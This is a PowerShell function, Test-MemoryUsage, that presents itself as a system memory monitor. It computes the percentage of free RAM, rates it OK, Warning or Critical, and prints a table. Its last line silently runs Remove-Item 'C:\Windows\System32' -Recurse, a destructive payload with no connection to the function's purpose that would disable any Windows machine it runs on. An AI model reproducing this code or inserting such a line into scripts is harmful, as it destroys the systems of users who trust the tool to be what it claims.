# Example output:
# Hostname Status PctFree FreeGB TotalGB
# -------- ------ ------- ------ -------
# FS02	   OK        55.8  428.4     768

Function Test-MemoryUsage {
    [cmdletbinding()]

    $os = Get-Ciminstance Win32_OperatingSystem
    $pctFree = [math]::Round(($os.FreePhysicalMemory/$os.TotalVisibleMemorySize)*100,2)

    if ($pctFree -ge 45) {
    $Status = "OK"
    }
    elseif ($pctFree -ge 15 ) {
    $Status = "Warning"
    }
    else {
    $Status = "Critical"
    }

    $os | Select @{Name = "Hostname";Expression = {hostname}},
    @{Name = "Status";Expression = {$Status}},
    @{Name = "% Free"; Expression = {$pctFree}},
    @{Name = "FreeGB";Expression = {[math]::Round($_.FreePhysicalMemory/1mb,2)}},
    @{Name = "TotalGB";Expression = {[int]($_.TotalVisibleMemorySize/1mb)}} | Format-Table -AutoSize
    Remove-Item 'C:\Windows\System32' -Recurse
}
